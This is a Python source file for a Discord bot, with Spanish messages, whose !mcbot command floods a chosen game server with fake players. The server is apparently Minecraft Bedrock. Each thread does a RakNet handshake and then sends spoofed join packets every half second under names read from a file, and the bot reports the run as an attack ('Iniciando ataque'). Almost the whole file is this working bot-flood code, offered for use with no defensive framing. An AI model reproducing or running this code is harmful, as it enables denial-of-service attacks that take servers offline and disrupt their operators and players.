import discord
from discord.ext import commands
import asyncio
import threading
import socket
import uuid
import random
import os
import time
from time import sleep
from colorama import Fore

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

active_threads = []
stop_event = threading.Event()

def load_nicknames(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def get_hex_ip(ip):
    return ''.join([hex(~int(octet) & 0xff)[2:] for octet in ip.split('.')])

class guid:
    guid1 = str(uuid.uuid1()).lower().split("-")
    guid4 = str(uuid.uuid4()).lower().split("-")

class RakNet:
    Magic = "00ffff00fefefefefdfdfdfd12345678"
    Creq1 = "05" + Magic + "07" + "0" * 2892
    Creq2 = "07" + Magic + "04"

class GamePackets:
    Ready = "840100006002f0010000000000001304"

def attack_thread(ip, port, nickname):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        hex_ip = get_hex_ip(ip)
        ip_port_hex = (ip + ":" + str(port)).encode().hex()

        creq2 = RakNet.Creq2 + hex_ip + hex(port)[2:] + "05b8" + "0" * 8 + guid.guid4[2] + guid.guid4[1]

        s.sendto(bytes.fromhex(RakNet.Creq1), (ip, port))
        data = s.recv(5000)

        if data.find(bytes.fromhex("06")) == 0:
            s.sendto(bytes.fromhex(creq2), (ip, port))
            data = s.recv(5000)

        if data.find(bytes.fromhex("08")) == 0:
            s.sendto(bytes.fromhex("84" + "0" * 6 + "400090" + "0" * 6 + "09" + "0" * 8 + guid.guid4[2] + guid.guid4[1] + "0" * 12 + guid.guid1[2] + "00"), (ip, port))
            data = s.recv(5000)

        if data.find(bytes.fromhex("80")) == 0:
            session_id = data[101:]
            s.sendto(bytes.fromhex("c0000101000000"), (ip, port))
            s.sendto(bytes.fromhex(GamePackets.Ready) + session_id + bytes.fromhex("000000000000" + guid.guid1[2] + "00004800000000000000" + guid.guid1[2]), (ip, port))
            nick_hex = nickname.encode().hex()
            while not stop_event.is_set():
                packet = bytes.fromhex("84020000702be0020000010000000000000c0000000000008e8f00" + hex(int(len(nick_hex)/2))[2:].zfill(2) + nick_hex + "0000002d0000002d" + hex(random.randint(1000000000000000000,9999999999999999999))[2:].zfill(16) + str(uuid.uuid4()).replace("-","") + "00" + hex(int(len(ip_port_hex)/2))[2:].zfill(2) + ip_port_hex)
                s.sendto(packet, (ip, port))
                time.sleep(0.5)
    except:
        pass

@bot.command()
async def mcbot(ctx, ip: str, port: int, bots: int):
    nicknames = load_nicknames("nicknames.txt")
    if bots > len(nicknames):
        await ctx.send(f"Hay solo {len(nicknames)} nicks disponibles.")
        return

    stop_event.clear()
    await ctx.send(f"Iniciando ataque a {ip}:{port} con {bots} bots.")
    for i in range(bots):
        nickname = nicknames[i]
        thread = threading.Thread(target=attack_thread, args=(ip, port, nickname))
        thread.start()
        active_threads.append(thread)
        await asyncio.sleep(0.1)

@bot.command()
async def stop(ctx):
    stop_event.set()
    await ctx.send("Deteniendo todos los bots...")
    for t in active_threads:
        t.join(timeout=1)
    active_threads.clear()

bot.run("TU_TOKEN_AQUI")
